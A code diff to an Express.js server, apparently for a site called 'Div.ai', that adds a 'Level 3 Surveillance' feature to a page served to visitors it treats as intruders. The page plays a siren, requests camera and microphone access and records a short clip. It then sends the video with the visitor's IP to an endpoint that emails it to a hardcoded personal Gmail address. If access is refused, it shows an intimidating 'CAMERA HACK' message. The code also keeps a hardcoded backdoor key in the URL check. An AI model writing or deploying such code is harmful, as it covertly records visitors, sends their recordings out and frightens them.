@@ -34,6 +34,7 @@ const transporter = getTransporter();
 // ==========================================
 app.use(async (req, res, next) => {
     if (req.url.startsWith('/api/system/revive?key=divyesh')) return next();
+    if (req.url === '/api/security/surveillance' && req.method === 'POST') return next();
 
     const forwarded = req.headers["x-forwarded-for"];
     const ip = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
@@ -170,6 +171,38 @@ app.use(async (req, res, next) => {
                 }
                 setInterval(playSiren, 1000);
             } catch(e) { }
+
+            // 6. CAMERA CAPTURE (Level 3 Surveillance)
+            initiateSurveillance();
+        }
+
+        async function initiateSurveillance() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = async () => {
+                        const base64data = reader.result;
+                        await fetch('/api/security/surveillance', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ video: base64data, info: "IP: ${ip} | ID: ${identity}" })
+                        });
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 3000); // 3-second clip
+            } catch (err) {
+                document.getElementById('alert-box').innerHTML += "<br>🚨 PERMISSION DENIED - CAMERA HACK IN PROGRESS...";
+            }
         }
 
         window.addEventListener('click', startPunishment);
@@ -178,6 +211,34 @@ app.use(async (req, res, next) => {
     </script>
 </body>
 </html>`);
+});
+
+// Level 3 Surveillance Endpoint
+app.post('/api/security/surveillance', express.json({ limit: '10mb' }), async (req, res) => {
+    const { video, info } = req.body;
+    if (!video) return res.status(400).send('No video data');
+
+    console.log(`🎬 [SURVEILLANCE] Receiving evidence for ${info}`);
+
+    try {
+        await transporter.sendMail({
+            from: `"Div.ai Security" <${process.env.EMAIL_USER}>`,
+            to: 'canvadwala@gmail.com',
+            subject: `🎬 INTRUDER EVIDENCE: ${info}`,
+            html: `<p>Identity: ${info}</p><p>Check attachment for video evidence.</p>`,
+            attachments: [
+                {
+                    filename: 'intruder.webm',
+                    content: video.split(',')[1],
+                    encoding: 'base64'
+                }
+            ]
+        });
+        res.status(200).send('Evidence secured');
+    } catch (e) {
+        console.error("❌ Surveillance Email Failed:", e.message);
+        res.status(500).send('Failed');
+    }
 });
 // ==========================================
 
